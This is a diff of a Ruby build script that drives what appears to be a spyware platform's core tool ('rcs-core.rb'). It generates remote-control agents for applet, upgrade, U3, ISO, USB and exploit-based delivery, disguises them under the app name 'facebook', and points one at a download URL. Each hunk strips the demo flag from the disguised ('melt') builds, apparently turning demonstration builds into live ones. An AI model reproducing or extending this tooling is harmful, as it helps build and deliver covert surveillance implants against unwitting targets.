@@ -24,7 +24,7 @@ system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build
 params = {platform: 'applet',
           generate: {platforms: ['osx', 'windows'],
                      binary: {demo: DEMO, admin: false},
-                     melt: {admin: false, demo: DEMO}
+                     melt: {admin: false}
                     },
           melt: {appname: 'facebook'}
           }
@@ -36,7 +36,7 @@ system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build
 params = {platform: 'upgrade',
           generate: {platforms: ['windows'],
                      binary: {demo: DEMO, admin: false},
-                     melt: {admin: false, demo: DEMO}
+                     melt: {admin: false}
                     },
           melt: {appname: 'facebook'}
           }
@@ -58,7 +58,7 @@ system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build
 params = {platform: 'u3',
           generate: {platforms: ['windows'],
                      binary: {demo: DEMO},
-                     melt: {admin: false, demo: DEMO}
+                     melt: {admin: false}
                     }
           }
 
@@ -69,7 +69,7 @@ system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build
 params = {platform: 'iso',
           generate: {platforms: ['osx', 'windows'],
                      binary: {demo: DEMO, admin: false},
-                     melt: {admin: false, demo: DEMO}
+                     melt: {admin: false}
                     }
           }
 
@@ -79,7 +79,7 @@ system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build
 ###################################################################################################
 params = {platform: 'usb',
           generate: {binary: {demo: DEMO, admin: false},
-                     melt: {admin: false, demo: DEMO}
+                     melt: {admin: false}
                     }
           }
 
@@ -108,7 +108,7 @@ params = {platform: 'exploit',
           generate: {exploit: 'HT-2012-000',
                      platforms: ['osx', 'windows'],
                      binary: {demo: DEMO, admin: false},
-                     melt: {admin: false, demo: DEMO}
+                     melt: {admin: false}
                     },
           melt: {appname: 'facebook',
                  url: 'http://download.me/'}
